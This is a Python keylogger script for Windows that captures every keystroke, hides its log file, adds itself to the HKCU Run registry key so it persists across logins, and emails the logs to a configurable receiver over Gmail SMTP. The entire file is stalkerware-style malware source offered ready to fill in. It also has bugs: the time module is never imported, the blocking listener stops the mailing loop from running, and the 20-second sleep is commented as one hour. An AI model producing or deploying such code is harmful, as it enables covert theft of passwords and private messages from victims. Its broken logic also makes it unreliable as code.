import logging
import smtplib
import win32api
import winreg
from pynput import keyboard

# Set up logging
log_dir = "" # Set a directory to store the log file
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Set up email
smtp_server = "smtp.gmail.com" # Use Gmail as the SMTP server
sender_email = "" # Your email address
receiver_email = "" # The email address to receive the keylogs
password = "" # Your email password

# Define the keylogging function
def on_press(key):
    logging.info(key)

# Set up the keylogger
def start_keylogging():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Send the keylogs via email
def send_logs():
    with open(log_dir + "key_log.txt", "r") as f:
        logs = f.read()
    server = smtplib.SMTP(smtp_server, 587)
    server.starttls()
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, logs)
    server.quit()

# Hide the log file
win32api.SetFileAttributes(log_dir + "key_log.txt", win32api.FILE_ATTRIBUTE_HIDDEN)

# Add the script to the startup programs
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_ALL_ACCESS)
winreg.SetValueEx(key, "KeyLogger", 0, winreg.REG_SZ, "C:\\path\\to\\script.py")
winreg.CloseKey(key)


# Start the keylogger
start_keylogging()

# Send the keylogs every hour
while True:
    send_logs()
    time.sleep(20) # Sleep for one hour


